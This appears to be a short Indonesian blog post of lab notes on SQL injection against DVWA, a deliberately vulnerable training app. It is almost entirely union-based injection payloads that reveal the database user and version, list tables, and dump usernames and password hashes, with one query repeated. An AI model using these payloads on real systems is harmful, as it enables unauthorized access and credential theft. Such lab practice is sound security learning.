---
layout: post
title: "(a chunk) Injeksi SQL - dvwa"
date: 2019-02-28 05:22:15 +0000
categories: Technology
comments: false
---
- bisa melihat user yang ada akses database:

```sql
select first_name, last_name from users where user_id = '%' or 0=0 union select null, user() #';
```

- bisa lihat versi dari database:
```sql
select first_name, last_name from users where user_id = '%' or 0=0 union select null, version() #'
```
- Melihat informassi table2 yang ada dalam skema db kita
```sql
select first_name, last_name from users where user_id = '%' and 1=0 union select null, table_name from information_schema.tables  #';
```
- Untuk mengecek apakah ada table user di salah satu db, masukkan perintah:
{% highlight sql %}
select first_name, last_name from users where user_id = '%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#';

select first_name, last_name from users where user_id = '%' and 1=0 union select null, concat(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) from users #';

select first_name, last_name from users where user_id = '%' and 1=0 union select null, concat(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) from users #';

{% endhighlight %}